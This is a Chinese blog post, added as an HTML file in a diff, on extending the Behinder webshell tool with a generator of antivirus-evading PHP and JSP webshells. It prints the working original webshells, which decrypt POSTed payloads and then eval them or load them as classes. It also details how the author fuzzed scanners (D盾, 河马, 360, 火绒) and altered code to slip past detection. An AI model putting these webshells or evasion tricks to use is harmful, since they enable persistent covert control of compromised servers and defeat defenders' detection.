@@ -1,0 +1,436 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>冰蝎二开从0到1-2(免杀) | Bohemian</title><meta name="author" content="bohemian"><meta name="copyright" content="bohemian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="..."><link rel="shortcut icon" href="/images/website/favicon.png"><link rel="canonical" href="https://bohemian.top/2025/07/06/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80v1-0/%E5%86%B0%E8%9D%8E%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?akkUkVXulwUkbwBp";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-3Z9EQ7RWNS"></script><script>window.dataLayer = window.dataLayer || []
+function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date())
+gtag('config', 'G-3Z9EQ7RWNS')
+btf.addGlobalFn('pjaxComplete', () => {
+  gtag('config', 'G-3Z9EQ7RWNS', {'page_path': window.location.pathname})
+}, 'google_analytics')
+</script><link rel="stylesheet" href="/-a" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"SFZ331F775","apiKey":"d942c1c63cb7ca27d841499faf4a0ec8","indexName":"blogsearch","hitsPerPage":6,"languages":{"input_placeholder":"搜索文章","hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，耗时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-right"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '冰蝎二开从0到1-2(免杀)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/website/avatar.jpg" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/冰蝎二开从0到1/image-20250706005428414.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Bohemian</span></a><a class="nav-page-title" href="/"><span class="site-name">冰蝎二开从0到1-2(免杀)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">冰蝎二开从0到1-2(免杀)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-05T18:39:55.000Z" title="发表于 2025-07-06 02:39:55">2025-07-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-20T08:08:02.726Z" title="更新于 2025-07-20 16:08:02">2025-07-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3,737</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>15分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>有小伙伴提议说，我们上个文章改了一下冰蝎的流量，但是在实际的应用中，我们打战肯定要先传木马落地，如果不能落地，那么你流量改的再好，其实也没有意义，想想，确实也是。没有第一步上传文件，哪里存在流量呢。</p>
+<p>那么这次咱们来做一下免杀。在实际的应用中，似乎我们经常碰到安全设备，奈何咱这也没有啥安全设备，我们就采用常见的厂商的在线杀软吧。如果有小伙伴有的话，可以帮我测测，把结果告诉我，笔者再进行优化。</p>
+<h5 id="ui编写"><a href="#ui编写" class="headerlink" title="ui编写"></a>ui编写</h5><p>在godzilla中，作者已经给我们写好了生成脚本的按钮，只需要自己去生成就好了，但是冰蝎是不自带的，冰蝎的木马是在我们下载的时候，放在同目录里面的，直接拿去用就好了。但似乎不太适合我们，为什么呢，因为就算我们将免杀后的木马放到目录下，他只能是一个文件，就是不能动态的生成了，一个免杀文件很容易被厂商标记，所以我们还是想办法去每次生成的都不太一样。</p>
+<p>net/rebeyond/behinder/ui/controller是冰蝎界面的目录，里面有很多文件，包含各种controller<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706025725077-17517418458692.png" alt="image-20250706025725077"></p>
+<p>其中java的肯定都是各种功能文件了，fxml是ui界面了，冰蝎的ui界面使用的是JavaFX。</p>
+<p><strong>JavaFX</strong> 是 Java 平台的一个图形用户界面（GUI）工具包，用于创建<strong>富客户端应用（Rich Client Application）</strong>。它是 Java 的官方 GUI 库之一，是 Swing 的现代替代方案，支持硬件加速、样式化（CSS）、动画、多媒体等功能。</p>
+<p>简单看一个main.fxml</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706030023010.png" alt="image-20250706030023010"></p>
+<p>可以看到一些TableColumn，也就是这里，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706030109566-17517420700973.png" alt="image-20250706030109566"></p>
+<p>需要改什么的话，改这里就可以了。</p>
+<p>这里不在讲解javafx的语法了，不是本文的重点，是在不会写，可以用scene builder去界面话编程，安装后<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706030455421.png" alt="image-20250706030455421"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706030515440.png" alt="image-20250706030515440"></p>
+<p>就可以使用了，直接拖动即可。</p>
+<p>接下来开始写，在net/rebeyond/behinder/ui/Main.fxml，先加个按钮，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706030708263.png" alt="image-20250706030708263"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706030716807.png" alt="image-20250706030716807"></p>
+<p>然后给到功能点，本来笔者想着直接在main.fxml里面直接写，但是把他的功能点net.rebeyond.behinder.ui.controller.MainController，copy一份后，总实报错，后面也没解决掉，索性直接从新定义一个Controller，写自己的功能。我们也从新定义一个免杀生成的界面，就是点击按钮后的界面，miansha.fxml</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706080335741.png" alt="image-20250706080335741"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706080719677.png" alt="image-20250706080719677"></p>
+<p>它的Controller，也是自己定义的，一会在里面写功能点。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706080437654.png" alt="image-20250706080437654"></p>
+<p>因为刚刚我们提到MainController不能重新写，老是报错，我们就将免杀的按钮绑定到main.java，然后读取miansha.fxml，也是一样的。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250706080647669.png" alt="image-20250706080647669"></p>
+<p>这样，整个框架就完成了，后面就是补一下每个生成免杀的功能点了。</p>
+<h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">	session_write_close();</span><br><span class="line">	<span class="variable">$post</span>=file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=openssl_decrypt(<span class="variable">$post</span>， <span class="string">&quot;AES128&quot;</span>， <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$arr</span>=explode(<span class="string">&#x27;|&#x27;</span>，<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @call_user_func(<span class="keyword">new</span> C()，<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先看原版的server端木马，定义了key，<code>$post=file_get_contents(&quot;php://input&quot;);</code>获取所有输入内容，这也就是我们上篇文章看到的冰蝎的流量是不需要传参的，拿到post的数据后，两种方式，如果没有openssl，就用post异或key，如果有openssl，那么就aes解发来的数据，然后用<code>|</code>区分eval和assert也就是区分php5和php7去执行命令</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250708142341950.png" alt="image-20250708142341950"></p>
+<p>后面就好理解了，用__invoke()方法，当你像调用函数一样“调用一个对象”时，PHP 会自动执行这个对象的 <code>__invoke()</code> 方法；</p>
+<p><code>class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</code>定义了一个类，<code>@call_user_func(new C()，$params);</code>调用这个类，此时$params=$p，然后执行上面图片中看到的eval。</p>
+<p>好，了解完木马，我们就可以写免杀了，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709231438699.png" alt="image-20250709231438699"></p>
+<p>源码肯定报毒，我们先来fuzz一下，</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709231528436.png" alt="image-20250709231528436"></p>
+<p>去掉一半，报</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709231610013.png" alt="image-20250709231610013"></p>
+<p>这个地方我们可以先base64 在解回来。</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709232118501.png" alt="image-20250709232118501"></p>
+<p>这里再把file_get_contents给拆除去，既可以了，当然也可以base64一下</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709232220803.png" alt="image-20250709232220803"></p>
+<p>此时就报eval了，我们再去解决eval的问题。<br>这里我们可以使用godzilla那种写法，就可以了</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709235845934.png" alt="image-20250709235845934"></p>
+<p>大家会看到，下面的魔术函数没了，其实不用，反正都是加载eval，有一个就可以了，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709232552802.png" alt="image-20250709232552802"></p>
+<p>报可疑文件，这里不知道哪里报了，我们接着fuzz<br>经过guzz发现是在xor那里，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709232744325-17520748650231.png" alt="image-20250709232744325"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$post</span>=<span class="variable">$sddd</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这好办，我们改改变量，改改数字即可，写到函数里就可以了。</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709234009451.png" alt="image-20250709234009451"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709234028560.png" alt="image-20250709234028560"></p>
+<p>河马本地版，<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709235052885.png" alt="image-20250709235052885"></p>
+<p>网页版有问题，我们也fuzz一下，</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709235150875.png" alt="image-20250709235150875"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709235833348.png" alt="image-20250709235833348">我们这里直接把eval拿掉，<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250709235652766.png" alt="image-20250709235652766"></p>
+<p>就可以了，啊这，<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710000036036.png" alt="image-20250710000036036"></p>
+<p>这里直接把所有的都删掉，就剩eval，<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710000109872.png" alt="image-20250710000109872"></p>
+<p>也还是不行，那这样的话，暂时就解决不掉了。<br>微步<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710005546630.png" alt="image-20250710005546630"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710005557304.png" alt="image-20250710005557304"></p>
+<p>火绒，360</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710010235877.png" alt="image-20250710010235877"></p>
+<p>其他就不在测试了，大家要是有啥商业的可疑帮我测测，提issue。好开始封装到里面，这次我们依然用动态的，保证每次生成的木马hash都不一样。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710010649587.png" alt="image-20250710010649587"></p>
+<p>先给定一个模板，然后将变量替换掉，花一点时间，写一下<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710012845890.png" alt="image-20250710012845890"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710022245696.png" alt="image-20250710022245696"></p>
+<p>ok，打包，编译<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710022415478.png" alt="image-20250710022415478"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710022447466.png" alt="image-20250710022447466"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710022434216.png" alt="image-20250710022434216"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710024629907.png" alt="image-20250710024629907"></p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710022526908.png" alt="image-20250710022526908"></p>
+<p>没有问题，正常使用。</p>
+<p><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250710024401997.png" alt="image-20250710024401997"></p>
+<p>好的，php我们就先到这里，接下来jsp。</p>
+<h5 id="jsp"><a href="#jsp" class="headerlink" title="jsp"></a>jsp</h5><p>老样子，先来学习一下jsp的木马</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*，javax.crypto.*，javax.crypto.spec.*&quot;</span>%&gt;&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b，<span class="number">0</span>，b.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;<span class="comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.putValue(<span class="string">&quot;u&quot;</span>，k);Cipher c=Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(<span class="number">2</span>，<span class="keyword">new</span> SecretKeySpec(k.getBytes()，<span class="string">&quot;AES&quot;</span>));<span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>木马很短，核心就是payload 解密 base64， 在解密aes 在动态类加载</p>
+<p>这里面经过笔者测试，&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b，0，b.length);}}%&gt;，容易被杀，session.putValue(“u”，k);Cipher c=Cipher.getInstance(“AES”);c.init(2，new SecretKeySpec(k.getBytes()，”AES”));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer也容易被杀，我们一点一点来，<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713192137570.png" alt="image-20250713192137570"></p>
+<p>原版的木马肯定报毒，我们fuzz一下，<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713194553717-17524071539801.png" alt="image-20250713194553717"></p>
+<p>直接给aes及功能去掉，不报，那就是，主要看下面这部分。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713194620941.png" alt="image-20250713194620941"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if (request.getMethod().equals(&quot;PO&quot;+&quot;ST&quot;))&#123;String ssss=&quot;e45e329feb5d925b&quot;;</span><br><span class="line">session.putValue(&quot;u&quot;，ssss);</span><br><span class="line">Cipher c=Cipher.getInstance(&quot;A&quot;+&quot;E&quot;+&quot;S&quot;);</span><br><span class="line">c.init(2，new SecretKeySpec(k.getBytes()，&quot;A&quot;+&quot;E&quot;+&quot;S&quot;));</span><br><span class="line">new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(request，response，seesion);&#125;%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>去除new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(request，response，seesion);，就要报可疑<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713201843980.png" alt="image-20250713201843980"></p>
+<p>那么首先我们给他拆开，这一句太长了。<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713203851218.png" alt="image-20250713203851218"></p>
+<p>花一点点时间拆开了<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713203923359.png" alt="image-20250713203923359"></p>
+<p>就报了可疑，那么还是需要fuzz一下，看看那一句话不行。经过测试发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">c.init(2， new SecretKeySpec(ssss.getBytes()， &quot;AES&quot;));</span><br><span class="line"></span><br><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line">XxYzLoader u = new XxYzLoader(cl);</span><br></pre></td></tr></table></figure>
+
+<p>经过笔者测试，这两句都有问题，一句是加载aes，一句是动态加载类，我们在上次的哥斯拉二开中，其实已经发现了，d盾会拦截getClassLoader这种类似的单词，所以这里我们还是用<code>getSystemClassLoader</code><br><code> ClassLoader cl = ClassLoader.getSystemClassLoader();  XxYzLoader u = new XxYzLoader(cl);</code></p>
+<p>上次的哥斯拉免杀aes加密也是拦截，也就是SecretKeySpec，哥斯拉用的是反射类加载绕过的，这里我们使用匿名类，大部分 AES 用法都需要 <code>SecretKeySpec</code>，但我们可以用一个匿名类直接实现 <code>SecretKey</code>，只要它返回的内容符合要求。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SecretKey key = <span class="keyword">new</span> javax.crypto.SecretKey() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAlgorithm</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;AES&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFormat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;RAW&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] getEncoded() &#123;</span><br><span class="line">        <span class="keyword">return</span> ssss.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>也就是这样，这样也就绕过了SecretKeySpec。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713212725771-17524132460002.png" alt="image-20250713212725771"></p>
+<p>这样我们改完，也就没有问题了，免杀d盾了。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713212823506.png" alt="image-20250713212823506"></p>
+<p>在线版河马也没有问题，上次我们的godzilla，jsp就没有过去，因为当时使用的是反射类加载，他会报反射类加载，这次并没有使用。<br>微步<br>也没啥问题。<br>火绒360<br><img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713213830826.png" alt="image-20250713213830826"></p>
+<p>ok，其他的就不在测试了，我们封装到冰蝎中，改改名，让他动起来。<img src="D:\myBlog\source\images\冰蝎二开从0到1-2\image-20250713221823114.png" alt="image-20250713221823114"></p>
